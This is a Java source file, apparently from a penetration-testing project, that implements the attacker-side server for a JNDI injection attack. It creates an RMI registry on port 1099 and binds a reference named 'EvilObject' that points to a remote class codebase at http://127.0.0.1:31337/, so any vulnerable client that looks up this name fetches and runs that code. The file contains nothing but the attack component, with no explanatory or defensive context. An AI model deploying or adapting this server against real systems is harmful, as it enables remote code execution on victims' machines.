package de.marko.pentest;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.Reference;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author marko
 * @version 1.0.0.
 * @date 21.08.2017
 */
public class JNDIServer {

	private final static Logger LOGGER = LoggerFactory.getLogger(JNDIServer.class);

	private static Registry registry;

	private static final String ref = "EvilObject";

	public static void main(String[] args) throws RemoteException {

		try {
			LOGGER.info("Creating RMI Registry");

			registry = LocateRegistry.createRegistry(1099);

			Reference reference = new Reference(ref, ref, "http://127.0.0.1:31337/");

			ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

			LOGGER.info("Binding 'refObjWrapper' to rmi://127.0.0.1:1099/" + ref);

			registry.bind(ref, referenceWrapper);

		} catch (IOException e) {
			LOGGER.error("Cannot create server interface.", e);
		} catch (AlreadyBoundException e) {
			LOGGER.error("Cannot create server interface. Port already bound", e);
		} catch (Exception e) {
			LOGGER.error("Cannot load EvilObject.", e);
		}
	}

}
